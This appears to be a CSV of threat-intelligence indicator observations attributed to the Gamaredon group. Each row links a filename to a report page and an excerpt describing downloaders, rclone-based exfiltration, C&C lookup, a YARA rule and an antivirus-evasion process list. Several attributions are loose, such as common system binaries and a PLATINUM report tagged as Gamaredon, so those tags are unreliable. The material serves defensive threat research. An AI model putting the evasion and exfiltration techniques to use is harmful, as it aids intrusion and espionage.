1.0.0,actor--gamaredon,artifact--sha256:d7eeb0adb0f0a41176cb676e461ab33a4ff2dc8defb9a04dd98c4b230bc803fd,observation--sha256:334bb219a2970da133febdac7a08fa16cea9e231a08edcd6f99796230fae7985,file-name,powershell.exe,powershell.exe,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"13 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Surprisingly, the update mechanism was completely removed from this version of PteroPSLoad. Regarding the communication protocol, two significant changes were made. The first one is that a new method of obtaining the IP address of the C&C server was added. PteroPSLoad now leverages a DNS - over-HTTPS (DoH) service provided by Cloudflare. To get the IP address, it sends an HTTP GET request to https://",
1.0.0,actor--gamaredon,artifact--sha256:d7eeb0adb0f0a41176cb676e461ab33a4ff2dc8defb9a04dd98c4b230bc803fd,observation--sha256:9bf0d9fa6c272cb6c7b3986ef520ec9a63c365eab9f89386fdb6534eb09cc0a9,file-name,powershell.exe,powershell.exe,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 26}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"25 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 For both vari ants, we have only seen PteroDash being used as a downloader component of PteroTemplate. PteroDig PteroDig (SHA -1: 1AEAE7A567C71200BA804801C4CEC227D2B64414 ), which we discovered in November 2022, is a PowerShell tool that weaponizes selected Desktop LNK files. It drops a basic skeleton of a downloader to %USERPROFILE% and stores relevant parts of the downloader script in the registry ",
1.0.0,actor--gamaredon,artifact--sha256:d7eeb0adb0f0a41176cb676e461ab33a4ff2dc8defb9a04dd98c4b230bc803fd,observation--sha256:59043be2459a9929d1714d3f5b41baf8042010c6dea2a9e8dbff94bd44eaf9b0,file-name,powershell.exe,powershell.exe,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"32 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroClone Discovered by ESET Research in July 2023, PteroClone (SHA-1: 5720FFDF9D9CD649445CBC12844E2B587622643A ) is a unique PowerShell tool that uses a legitimate command line program – rclone – for managing files on cloud storage to download the next stage . It first downloads the rclone binary and c onfiguration file to %APPDATA%\Defrag , naming them Defrag.exe and rclone.conf , respectively. It",
1.0.0,actor--gamaredon,artifact--sha256:086222ea740dd844cf6bbb98df97df1de8ce5fe7cd8f56372e1c1262013ba07c,observation--sha256:eab51e8661e79de5b8e6956a3232d0679e2a76336f0e023d40f4b5b67da5d486,file-name,pp4x322.dll,pp4x322.dll,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Figure 6. Malicious Word 2003 files used by PLATINUM to deliver CVE-2013-7331 Filename SHA1 URL for PNG Exploit Gerakan Anti SBY II.doc 1bdc1a0bc995c1beb363b11b71c14324be8577c9 mister.nofrillspace.com/users/web8_dice/4226/space.gif Tu_Vi_Nam_Tan_ Mao_2011.doc 2a33542038a85db4911d7b846573f6b251e16b2d intent.nofrillspace.com/users/web11_focus/3807/space.gif Wikileaks Indonesia.doc d6a795e839f51c1a5aeabf5c10664936ebbef8ea mister.nofrillspace.com/users/web8_dice/3791/space.gif Top 11 Aerial Surveill,
1.0.0,actor--gamaredon,artifact--sha256:be12a6b188b7acc4b542692a1a49583b1f484248308c394656ee37b4bae6ef76,observation--sha256:6061328eebc5b321b73555d7f556f0d0ad0745cae2b545e46396ca512f496c78,file-name,processexplorer.exe,processexplorer.exe,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 27}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"The exchange of such electronic documents actually creates a technical channel for the distribution of malware through trusted sources. Avoiding detection and c hecking the operational environment In the process of evolution of malicious software, it was found that its functionality involves checking the startup environment, the operation of network monitoring tools and the presence of antivirus software . The group’s use of the following techniques was recorded: - pinging Google DNS servers wit",
1.0.0,actor--gamaredon,artifact--sha256:8c5b252b8a9657f610ecd153d9b79286426cae94f104604da616cb5cd7f085ca,observation--sha256:3f237ef0a5af96a544419a9576764359cb2985b53b78800ad97c26bc47c43662,file-name,profiles_c.ini,profiles_c.ini,candidate,2023-03-17T00:00:00Z,day,known,same-record,,source--gamaredon--43ece8b760fd4f72,Gamaredon/Cybergun_Technical_Analysis_of_the_Armageddons_Infostealer.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Cybergun: Technical Analysis of the Armageddon's Infostealer 13 YARA RULE rule Armageddon_Pteranodon { meta: author = ""seyitsec"" date = ""2023-03-17"" hash = ""139547707f38622c67c8ce2c026bf32052edd4d344f03a0b37895b5de016641a"" strings: str1=”Global\flashUpdated_r” str2=”profiles_c.ini” str3=”Mozilla/1.0 (Windows NT 6.1; Win64; x64; rv:102.0) Gecko Firefox/102.0 (64-bit)” str4=”trend.txt” condition: all of ($str*) } IOCs TYPE IOC SHA-256 HASH 139547707f38622c67c8ce2c026bf32052edd4d344f03a0b37895b 5de",
1.0.0,actor--gamaredon,artifact--sha256:8c5b252b8a9657f610ecd153d9b79286426cae94f104604da616cb5cd7f085ca,observation--sha256:a2a38253fb28917d754215085cab47bb446ae592a60837550a3481b0c213a4a5,file-name,profiles_c.ini,profiles_c.ini,candidate,,unknown,unknown,not-stated,,source--gamaredon--43ece8b760fd4f72,Gamaredon/Cybergun_Technical_Analysis_of_the_Armageddons_Infostealer.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Cybergun: Technical Analysis of the Armageddon's Infostealer 6 To gain persistence, it creates a registry entry “Windows Task” under the RUN key. Then it prepares the string for L”C:\\Users\\{username}\\AppData\\Local\\profiles_c.ini” . After it creates a 12 characters random “x” string it creates a directory under the %TEMP% with the name of “x” string.",
1.0.0,actor--gamaredon,artifact--sha256:1265451eba36779a5aba3aa8473d343026b196b83532eda6d95bbeb35eddb67a,observation--sha256:17f336f4fb83e70f8b1d840fbcf67e30fce9b12898e5a8a0b6b1c0d93aec1610,file-name,proguard.exe,proguard.exe,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Figure 15. Security-related processes avoided by the JPIN installer Process Security product 360tray.exe 360 Safeguard bdagent.exe BitDefender proguard.exe Process Guard blackd.exe BlackICE blackice.exe BlackICE savservice.exe Sophos Anti-Virus avp.exe Kaspersky Anti-Virus rstray.exe Rising Anti-virus cmccore.exe CMC Antivirus cmctrayicon.exe CMC Antivirus zhudongfangyu.exe 360 Safeguard After installing the backdoor, the installer deletes itself from the compromised computer. PLATINUM uses at l",
1.0.0,actor--gamaredon,artifact--sha256:c1da5187a502acaeb44f48870080a2dfb1c48700ccf970bd9add4b45109f3b4d,observation--sha256:5ac9b4bc033d2f2d099b3257b39239c88a80b2cbb05b94cb142c882fe8832eb8,file-name,ps.php,ps.php,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"10 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 General -purpose downloaders We recognize eight types of general -purpose downloaders: five standalone and three built -in. Standalone downloaders primarily deliver payloads, whereas built -in dow nloaders have other primary capabilities but can also deliver payloads. PteroPSLoad PteroPSLoad is a downloader written in PowerShell that we discovered in October 2021 . After it is deployed, it remains pe",
1.0.0,actor--gamaredon,artifact--sha256:c1da5187a502acaeb44f48870080a2dfb1c48700ccf970bd9add4b45109f3b4d,observation--sha256:dd5dc76e866923cbc6b9f1555390517a07fdeb07e91f62c967e894a612d53bb3,file-name,ps.php,ps.php,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,11 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 URL leading to a PE file PowerShell command Encrypted VBScript PteroPSLoad time.php 13BA279D8602FEE7CEDE152B6A9148CD9D2F6662 ✓ ✓ PteroPSLoad slot.php B99D4724077B0A2CBEEE38332C05F3D4171C9DCC ✓ ✓ ✓ PteroPSLoad index.php 025E3D88C53FC12D5A4AAB726E696F2815BAC84D ✓ ✓ ✓ PteroPSLoad new.php D5576E578518E474A5DFF654C44AB3EC4A6E4ECF ✓ ✓ ✓ PteroPSLoad post.php E0BD8855159CB708789C4DE183E107C5C117FBA1 ✓ ✓ ✓ Pt,
1.0.0,actor--gamaredon,artifact--sha256:3dc517caffe188bf0d10d0cbcbabd4e35f3fe346941fe5ed8a873b43d5f7d58c,observation--sha256:dc141a8d36914cfdb5d4cc2b1d64b71518754963dbea2eec55a9fe00fe396fac,file-name,pst.php,pst.php,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"10 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 General -purpose downloaders We recognize eight types of general -purpose downloaders: five standalone and three built -in. Standalone downloaders primarily deliver payloads, whereas built -in dow nloaders have other primary capabilities but can also deliver payloads. PteroPSLoad PteroPSLoad is a downloader written in PowerShell that we discovered in October 2021 . After it is deployed, it remains pe",
1.0.0,actor--gamaredon,artifact--sha256:3dc517caffe188bf0d10d0cbcbabd4e35f3fe346941fe5ed8a873b43d5f7d58c,observation--sha256:6c9621ca18c9f2ebabb7cca400c9fc694824e9e9ed87261aab3746503347f6af,file-name,pst.php,pst.php,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,11 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 URL leading to a PE file PowerShell command Encrypted VBScript PteroPSLoad time.php 13BA279D8602FEE7CEDE152B6A9148CD9D2F6662 ✓ ✓ PteroPSLoad slot.php B99D4724077B0A2CBEEE38332C05F3D4171C9DCC ✓ ✓ ✓ PteroPSLoad index.php 025E3D88C53FC12D5A4AAB726E696F2815BAC84D ✓ ✓ ✓ PteroPSLoad new.php D5576E578518E474A5DFF654C44AB3EC4A6E4ECF ✓ ✓ ✓ PteroPSLoad post.php E0BD8855159CB708789C4DE183E107C5C117FBA1 ✓ ✓ ✓ Pt,
1.0.0,actor--gamaredon,artifact--sha256:2027a5714ad87a354b3d59607990bb93619899daaa7fbadad7fed785c1bea82c,observation--sha256:988ecc906d1cb0453568a4afa481369c2971127a94749e70de23b3fed1553d3d,file-name,put.php,put.php,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"10 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 General -purpose downloaders We recognize eight types of general -purpose downloaders: five standalone and three built -in. Standalone downloaders primarily deliver payloads, whereas built -in dow nloaders have other primary capabilities but can also deliver payloads. PteroPSLoad PteroPSLoad is a downloader written in PowerShell that we discovered in October 2021 . After it is deployed, it remains pe",
1.0.0,actor--gamaredon,artifact--sha256:2027a5714ad87a354b3d59607990bb93619899daaa7fbadad7fed785c1bea82c,observation--sha256:1575afad888b456007b956b40e2a6c2e816c7d01a9d3ba196bef8917150a5cd3,file-name,put.php,put.php,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,11 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 URL leading to a PE file PowerShell command Encrypted VBScript PteroPSLoad time.php 13BA279D8602FEE7CEDE152B6A9148CD9D2F6662 ✓ ✓ PteroPSLoad slot.php B99D4724077B0A2CBEEE38332C05F3D4171C9DCC ✓ ✓ ✓ PteroPSLoad index.php 025E3D88C53FC12D5A4AAB726E696F2815BAC84D ✓ ✓ ✓ PteroPSLoad new.php D5576E578518E474A5DFF654C44AB3EC4A6E4ECF ✓ ✓ ✓ PteroPSLoad post.php E0BD8855159CB708789C4DE183E107C5C117FBA1 ✓ ✓ ✓ Pt,
1.0.0,actor--gamaredon,artifact--sha256:5ad7993ef7cd450db6faa141ba867f9e2c178f613f4377a538b0718f9a2db655,observation--sha256:fab6cbbad39c305fb0ad0798fce8d0eaa77e3ccfc9ad4f4a4c1375646220c7e2,file-name,rclone.conf,rclone.conf,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"32 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroClone Discovered by ESET Research in July 2023, PteroClone (SHA-1: 5720FFDF9D9CD649445CBC12844E2B587622643A ) is a unique PowerShell tool that uses a legitimate command line program – rclone – for managing files on cloud storage to download the next stage . It first downloads the rclone binary and c onfiguration file to %APPDATA%\Defrag , naming them Defrag.exe and rclone.conf , respectively. It",
1.0.0,actor--gamaredon,artifact--sha256:5ad7993ef7cd450db6faa141ba867f9e2c178f613f4377a538b0718f9a2db655,observation--sha256:9d620d6c9beb850d4cd57af84bae905879793a61176987f8a753ed9f4940117e,file-name,rclone.conf,rclone.conf,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"23 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Figure 15. The function in PteroBox that obtains a Dropbox token (redacted) Rclone variant On April 21st, 2025, we discovered a variant of PteroBox that uses rclone , instead of the Dropbox API, to upload files to Dropbox. This variant downloads the rclone utility from a hardcoded Gamaredon C&C server, storing it in %APPDATA% \rclone \ as rclone.exe or 1.exe. It then drops an embedded rclone configuration file ( %AP",
1.0.0,actor--gamaredon,artifact--sha256:5ad7993ef7cd450db6faa141ba867f9e2c178f613f4377a538b0718f9a2db655,observation--sha256:8cbf33b8062f1ac7bcfada774e41ede30f95987924459b271cd4a4dd99eda53f,file-name,rclone.conf,rclone.conf,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 45}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"45 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value %USERPROFILE% \%USERNAME% \([a-zA-Z0-9]{19,25}): \1 Configuration paths HKCU\EUDC\[a-zA-Z0-9]{19,25} Mutexes Global \MutexLaos Global \MutexLaos1 Global \MutexNosa Global \MutexNosas Global \MutexTa Global \MutexTanos Global \MutexTanoss Global \MutexTest APPENDIX F: HOST -BASED ARTIFACTS ASSOCIATED WITH PTEROBOX Name Value Installation paths HKCU\Keyboard Layout \getListFile HKCU\Keyboard Layout \usb HKC",
1.0.0,actor--gamaredon,artifact--sha256:d94e01a92be6f7e9c54480fd3cb154fd5d99200eb1e711dfe22233e82cea4b41,observation--sha256:b9da0f37ca7877fcf9b9f0ca89d18580620a7b5af0357be8c1b77183ec173901,file-name,rclone.exe,rclone.exe,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"23 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Figure 15. The function in PteroBox that obtains a Dropbox token (redacted) Rclone variant On April 21st, 2025, we discovered a variant of PteroBox that uses rclone , instead of the Dropbox API, to upload files to Dropbox. This variant downloads the rclone utility from a hardcoded Gamaredon C&C server, storing it in %APPDATA% \rclone \ as rclone.exe or 1.exe. It then drops an embedded rclone configuration file ( %AP",
1.0.0,actor--gamaredon,artifact--sha256:d94e01a92be6f7e9c54480fd3cb154fd5d99200eb1e711dfe22233e82cea4b41,observation--sha256:ade86c9f5610fcdd82e107a4cbcfb5936d7798fc4cdb626e0e6accebebd3d481,file-name,rclone.exe,rclone.exe,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 45}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"45 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value %USERPROFILE% \%USERNAME% \([a-zA-Z0-9]{19,25}): \1 Configuration paths HKCU\EUDC\[a-zA-Z0-9]{19,25} Mutexes Global \MutexLaos Global \MutexLaos1 Global \MutexNosa Global \MutexNosas Global \MutexTa Global \MutexTanos Global \MutexTanoss Global \MutexTest APPENDIX F: HOST -BASED ARTIFACTS ASSOCIATED WITH PTEROBOX Name Value Installation paths HKCU\Keyboard Layout \getListFile HKCU\Keyboard Layout \usb HKC",
1.0.0,actor--gamaredon,artifact--sha256:cfa46af5f18c553f26f36ff934dea67dd7fa043a28fa34418284d52bd90314e7,observation--sha256:08b3cd08f162273cda64698d11d43fe7d44389cdbe90a0c8e459ccbd0c23c391,file-name,rl.exe,rl.exe,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"13 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Surprisingly, the update mechanism was completely removed from this version of PteroPSLoad. Regarding the communication protocol, two significant changes were made. The first one is that a new method of obtaining the IP address of the C&C server was added. PteroPSLoad now leverages a DNS - over-HTTPS (DoH) service provided by Cloudflare. To get the IP address, it sends an HTTP GET request to https://",
1.0.0,actor--gamaredon,artifact--sha256:0ad6dbd3ef7d52eb9f5ac55a0ea7e81e5e89c67587e729e878147fe7e612bd73,observation--sha256:ee7a08396a1a2d4c16865aeae4a89a80b6a40921500ea30217e998681b073560,file-name,rstray.exe,rstray.exe,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Figure 15. Security-related processes avoided by the JPIN installer Process Security product 360tray.exe 360 Safeguard bdagent.exe BitDefender proguard.exe Process Guard blackd.exe BlackICE blackice.exe BlackICE savservice.exe Sophos Anti-Virus avp.exe Kaspersky Anti-Virus rstray.exe Rising Anti-virus cmccore.exe CMC Antivirus cmctrayicon.exe CMC Antivirus zhudongfangyu.exe 360 Safeguard After installing the backdoor, the installer deletes itself from the compromised computer. PLATINUM uses at l",
1.0.0,actor--gamaredon,artifact--sha256:d440f63510824a4e144a5584d7b3101d16afe88dc50d170add00d4335ae40223,observation--sha256:9abf2a0c9356244740f6839e308713024338889af915d23ac9d4a1610fc3724a,file-name,.rtf.lnk,rtf.lnk,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 22}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"21 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 payload, pauses for a few seconds, and deletes all three files: the dropper, itself, and the VBScript payload. Throughout PteroCDrop’s lifetime, Gamaredon has used various compilers to build it and in some of the samples this PDB path was left: E:\Projects\sfx\Extractor10\281021\Debug\090721.pdb Overall, the most prevalent payload delivered by PteroCDrop is a VBScript version of PteroLNK. During 2023",
1.0.0,actor--gamaredon,artifact--sha256:d440f63510824a4e144a5584d7b3101d16afe88dc50d170add00d4335ae40223,observation--sha256:30bb47293de14fb375cebed3cce9c31766c3ea2935bb5e0b1c2c79adb2cebd18,file-name,.rtf.lnk,rtf.lnk,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 50}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,49 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Tactic ID Name Description T1564.001 Hide Artifacts: Hidden Files and Directories PteroLNK creates hidden files. T1562.001 Impair Defenses: Disable or Modify Tools PteroSocks disables AMSI by calling the method AmsiUtils.Uninitialize . T1070.004 Indicator Removal: File Deletion PteroPSDoor deletes staged files after successful exfiltration. T1036.004 Masquerading: Masquerade Task or Service Gamaredon,
1.0.0,actor--gamaredon,artifact--sha256:1cf9cf267a3bb049d9e1d1182acac1380474e352a7772d0254cacaeb04ee81c7,observation--sha256:aaf27a29fe79756347a1aeae6d90b6bde6f76a0e34cffc0dc7f196159109b739,file-name,rundll32.exe,rundll32.exe,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 37}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"37 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Tactic ID Name Description T1027.015 Obfuscated Files or Information: Compression Gamaredon uses, in its spearphishing campaigns, bzip2 -compressed HTA files, and HTA files packed in ZIP and RAR archives. T1027.016 Obfuscated Files or Information: Junk Code Insertion Gamaredon inserts junk code into its malicious tools. T1684.001 Social Engineering: Impersonation Gamaredon sends spearphishing emails impersonating Uk",
1.0.0,actor--gamaredon,artifact--sha256:600f67f698251bcf06929f995248eccc960b8fa924742fb53e1550afc265508e,observation--sha256:5bf9c6bbaea50fcd10f37c6211a19503566aa528f724a2376d4ef32b2d337c76,file-name,runner.tmp,runner.tmp,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"19 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Downloader of PteroPSDoor variant 2 We know about two versions of the downloader that deploys PteroPSDoor variant 2 . Their functionality is similar, but the older one is a VBScript with an embedded PowerShell command line, while the newer one is a PowerShell script encapsulated in a VBScript. The older version uses the URI /new and comprises two parts. The first part executes a brief PowerShell comm",
1.0.0,actor--gamaredon,artifact--sha256:53f76e3de413d3cea1e61b54c8e3ebd4f72920884d41e7b67bd77f23dab3b911,observation--sha256:b105beebb4a3c6e7fbb7420da7f8a254a4b99e14062435fc7e028c7a5c8497e4,file-name,savservice.exe,savservice.exe,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Figure 15. Security-related processes avoided by the JPIN installer Process Security product 360tray.exe 360 Safeguard bdagent.exe BitDefender proguard.exe Process Guard blackd.exe BlackICE blackice.exe BlackICE savservice.exe Sophos Anti-Virus avp.exe Kaspersky Anti-Virus rstray.exe Rising Anti-virus cmccore.exe CMC Antivirus cmctrayicon.exe CMC Antivirus zhudongfangyu.exe 360 Safeguard After installing the backdoor, the installer deletes itself from the compromised computer. PLATINUM uses at l",
1.0.0,actor--gamaredon,artifact--sha256:c666424d443efb23bf1c17623554eafcc8b7d7e99cc46dbea48b62007ccf0d1e,observation--sha256:7e5e24ece4cce77ba0c3a146fb48dd0413e7c59d970df2a900f1937f4a529148,file-name,script.exe,script.exe,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,".bat, .js, etc.) , as well as prohibit the unpacking of such files by archivers. Additionally, disable all executable files from the %AppData% directory. 5. Prohibit the use of cmd and powershell programs in the information system with user rights. Disable the ability to r un any scripts (*script.exe) with the users’ rights . 6. Prohibit the automatic launch of programs with the operating system, as well as access to programs in the system registry. 7. Pay attention to all incoming e -mail, espe",
1.0.0,actor--gamaredon,artifact--sha256:716f78f7c7fdbb78fc4030c57fdc6f884f3988eb8b8d52d6c580da3b718cd8ec,observation--sha256:556768f7f9ac6692ae613427fa82f0db861cefbb7b127993768490b8ffe869f5,file-name,search.php,search.php,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"22 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroLNK is obfuscated in multiple layers, detailed in the Obfuscation section. The obfuscation applied to the scheduler component, where selected characters are replaced with random sequences, is also used on code blocks embedded as base64 -encoded blobs. Nearly all strin g variables and small code blocks are divided into smaller parts and then concatenated before use or execution. Additionally, fun",
1.0.0,actor--gamaredon,artifact--sha256:e42f6a6e1ff39c802118665ec84a762a8a0de33e9ff009d6b8a5108f13befb07,observation--sha256:9d11d4b4c42d7f78e5db0bb938caa5091554b4b62b7c40d5a0f1d7403efdf4f4,file-name,shell32.dll,shell32.dll,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 22}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"- repeating the cycle laid down in the file, which allows you to download and run almost any file in the system and provides full control over the system; - checking the file size before start and in case of conformity to conditions, the file is started; - searching for all available disks with letters from ""D"" to ""Z""; - checking for the possibility of creating and executing processes, as well as the presence of a connection to the Internet and to the command & control server of attackers; - dow",
1.0.0,actor--gamaredon,artifact--sha256:e42f6a6e1ff39c802118665ec84a762a8a0de33e9ff009d6b8a5108f13befb07,observation--sha256:45a85a45d476348dd1340baa3ebea9540aec3b9fbf5bfc3514bfcf0a19d81bf7,file-name,shell32.dll,shell32.dll,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"22 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroLNK is obfuscated in multiple layers, detailed in the Obfuscation section. The obfuscation applied to the scheduler component, where selected characters are replaced with random sequences, is also used on code blocks embedded as base64 -encoded blobs. Nearly all strin g variables and small code blocks are divided into smaller parts and then concatenated before use or execution. Additionally, fun",
1.0.0,actor--gamaredon,artifact--sha256:ce4e5c06680ead500e18858ddc36b70f750b205ef542d80bc3bedade41981ac8,observation--sha256:01e81a5490300e883042bf75614007de7abff29b8b3b5b4a162e66580348f646,file-name,sleep.php,sleep.php,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"22 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroLNK is obfuscated in multiple layers, detailed in the Obfuscation section. The obfuscation applied to the scheduler component, where selected characters are replaced with random sequences, is also used on code blocks embedded as base64 -encoded blobs. Nearly all strin g variables and small code blocks are divided into smaller parts and then concatenated before use or execution. Additionally, fun",
1.0.0,actor--gamaredon,artifact--sha256:9d77797bfccd28714260d89a431b3759bce4ee43cac9338ad1ce718c1f49f66e,observation--sha256:13b1492e22ea9e3d194f4608c2252ee57261be09b134b7b1c2b0aadd6ceb2a68,file-name,slot.php,slot.php,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,11 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 URL leading to a PE file PowerShell command Encrypted VBScript PteroPSLoad time.php 13BA279D8602FEE7CEDE152B6A9148CD9D2F6662 ✓ ✓ PteroPSLoad slot.php B99D4724077B0A2CBEEE38332C05F3D4171C9DCC ✓ ✓ ✓ PteroPSLoad index.php 025E3D88C53FC12D5A4AAB726E696F2815BAC84D ✓ ✓ ✓ PteroPSLoad new.php D5576E578518E474A5DFF654C44AB3EC4A6E4ECF ✓ ✓ ✓ PteroPSLoad post.php E0BD8855159CB708789C4DE183E107C5C117FBA1 ✓ ✓ ✓ Pt,
